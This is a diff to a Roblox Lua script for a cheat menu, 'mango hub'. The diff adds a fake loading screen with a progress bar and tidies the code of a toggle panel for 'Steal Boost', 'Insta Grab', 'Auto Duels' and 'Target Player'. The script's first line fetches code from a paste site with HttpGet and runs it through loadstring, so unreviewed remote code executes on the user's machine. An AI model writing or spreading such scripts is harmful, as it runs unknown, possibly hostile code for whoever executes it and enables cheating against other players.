@@ -1,9 +1,67 @@
 loadstring(game:HttpGet("https://pastefy.app/gBpO0gpe/raw"))()
 local player = game.Players.LocalPlayer
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "MangoHubUI"
+gui.Name = "MangoHubFull"
 
--- MAIN FRAME
+--========================--
+-- PURPLE LOADING SCREEN
+--========================--
+
+local blur = Instance.new("BlurEffect", game.Lighting)
+blur.Size = 18
+
+local loadFrame = Instance.new("Frame", gui)
+loadFrame.Size = UDim2.new(1,0,1,0)
+loadFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+loadFrame.BackgroundTransparency = 0.3
+
+local box = Instance.new("Frame", loadFrame)
+box.Size = UDim2.new(0, 220, 0, 85)
+box.Position = UDim2.new(0.5, -110, 0.5, -42)
+box.BackgroundColor3 = Color3.fromRGB(20,20,20)
+box.BorderSizePixel = 0
+
+Instance.new("UICorner", box).CornerRadius = UDim.new(0,12)
+
+-- Title
+local text = Instance.new("TextLabel", box)
+text.Size = UDim2.new(1,0,0,35)
+text.BackgroundTransparency = 1
+text.Text = "mango hub"
+text.TextColor3 = Color3.fromRGB(200,150,255)
+text.Font = Enum.Font.GothamBold
+text.TextSize = 16
+
+-- Progress Bar BG
+local barBG = Instance.new("Frame", box)
+barBG.Size = UDim2.new(1,-30,0,6)
+barBG.Position = UDim2.new(0,15,1,-20)
+barBG.BackgroundColor3 = Color3.fromRGB(50,40,60)
+barBG.BorderSizePixel = 0
+
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
+
+-- Progress Bar (PURPLE)
+local bar = Instance.new("Frame", barBG)
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(170,0,255)
+bar.BorderSizePixel = 0
+
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+
+-- Loading (10 sec)
+for i = 1,100 do
+	bar.Size = UDim2.new(i/100,0,1,0)
+	task.wait(0.1)
+end
+
+loadFrame:Destroy()
+blur:Destroy()
+
+--========================--
+-- MANGO HUB UI (SMALL)
+--========================--
+
 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0, 150, 0, 185)
 frame.Position = UDim2.new(0.5, -75, 0.5, -92)
@@ -43,9 +101,8 @@ line.Position = UDim2.new(0,10,0,24)
 line.BackgroundColor3 = Color3.fromRGB(120,120,120)
 line.BorderSizePixel = 0
 
--- ROW FUNCTION (MORE ACCURATE SPACING)
+-- ROW FUNCTION
 local function row(name, key, y)
-	-- TEXT
 	local txt = Instance.new("TextLabel", frame)
 	txt.Position = UDim2.new(0,10,0,y)
 	txt.Size = UDim2.new(0,80,0,16)
@@ -56,7 +113,6 @@ local function row(name, key, y)
 	txt.TextColor3 = Color3.new(1,1,1)
 	txt.TextXAlignment = Enum.TextXAlignment.Left
 
-	-- KEY BOX
 	local keyBox = Instance.new("TextLabel", frame)
 	keyBox.Position = UDim2.new(0,90,0,y)
 	keyBox.Size = UDim2.new(0,20,0,16)
@@ -65,32 +121,24 @@ local function row(name, key, y)
 	keyBox.Font = Enum.Font.GothamBold
 	keyBox.TextSize = 10
 	keyBox.TextColor3 = Color3.new(1,1,1)
-
 	Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0,5)
 
-	-- TOGGLE BG
 	local toggle = Instance.new("TextButton", frame)
 	toggle.Position = UDim2.new(1,-42,0,y)
 	toggle.Size = UDim2.new(0,34,0,16)
 	toggle.BackgroundColor3 = Color3.fromRGB(40,40,40)
 	toggle.Text = ""
-
 	Instance.new("UICorner", toggle).CornerRadius = UDim.new(1,0)
 
-	-- CIRCLE
 	local circle = Instance.new("Frame", toggle)
 	circle.Size = UDim2.new(0,14,0,14)
 	circle.Position = UDim2.new(0,1,0.5,-7)
 	circle.BackgroundColor3 = Color3.new(1,1,1)
 	circle.BorderSizePixel = 0
-
 	Instance.new("UICorner", circle).CornerRadius = UDim.new(1,0)
 
-	-- STATE (default ON like image except target)
 	local on = true
-	if name == "Target Player" then
-		on = false
-	end
+	if name == "Target Player" then on = false end
 
 	local function update()
 		if on then
@@ -110,14 +158,14 @@ local function row(name, key, y)
 	end)
 end
 
--- ROWS (MATCHED ORDER/SPACING)
+-- ROWS
 row("Steal Boost","X",32)
 row("Jump Boost","C",55)
 row("Insta Grab","G",78)
 row("Auto Duels","H",101)
 row("Target Player","D",124)
 
--- DROP BUTTON (MATCH STYLE)
+-- DROP BUTTON
 local drop = Instance.new("TextButton", frame)
 drop.Position = UDim2.new(0,10,1,-28)
 drop.Size = UDim2.new(1,-20,0,20)
